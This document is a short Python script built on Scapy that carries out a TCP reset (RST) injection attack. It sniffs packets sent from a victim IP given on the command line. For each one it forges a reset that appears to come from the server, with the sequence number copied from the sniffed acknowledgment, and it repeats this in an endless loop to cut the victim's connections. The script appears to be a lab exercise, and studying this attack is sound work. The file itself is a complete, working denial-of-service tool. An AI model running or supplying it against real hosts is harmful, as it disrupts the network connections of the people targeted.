#!/usr/bin/python3

#running command: python RST.py victimIP

import sys  #for command line argument
import time
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy

victim_ip = sys.argv[1]


def sendRST(pkt):

    IPLayer = IP(dst=victim_ip, #victim's ip
        src=pkt[IP].dst)        #server's ip from sniffed packet
    
    TCPLayer = TCP(flags="R",   #reset flag
        seq=pkt[TCP].ack,       #victim expecting this sequence number
        dport=pkt[TCP].sport,   #victim's port number from sniffed packet
        sport=pkt[TCP].dport)   #server's port number from sniffed packet
    
    spoofpkt = IPLayer/TCPLayer

    send(spoofpkt, verbose=2)


    print(pkt.summary())                            #sniffed packet

    print("IP source = " + str(pkt[IP].src))        #victim ip
    print("Port source = " + str(pkt[TCP].sport))   #victim port
    print("IP dest = " + str(pkt[IP].dst))          #server ip
    print("Port dest = " + str(pkt[TCP].dport))     #server port
    print("ACK = " + str(pkt[TCP].ack))             #ack number

    print()


    print(spoofpkt.summary())

    print("Spoofed IP source = " + str(spoofpkt[IP].src))
    print("Spoofed Port source = " + str(spoofpkt[TCP].sport))
    print("Spoofed IP dest = " + str(spoofpkt[IP].dst))
    print("Spoofed Port dest = " + str(spoofpkt[TCP].dport))
    print("Spoofed SEQ = " + str(spoofpkt[TCP].seq))   

    
    print()    
    print()

    time.sleep(randint(1, 2))   #random sleep
                                #otherwise too much traffic



while 1:
    pkt = sniff(filter="tcp and src host " + victim_ip, #sniff victim's packet
        prn=sendRST,                                    #spoofing function
        store=0, 
        count=1)
    
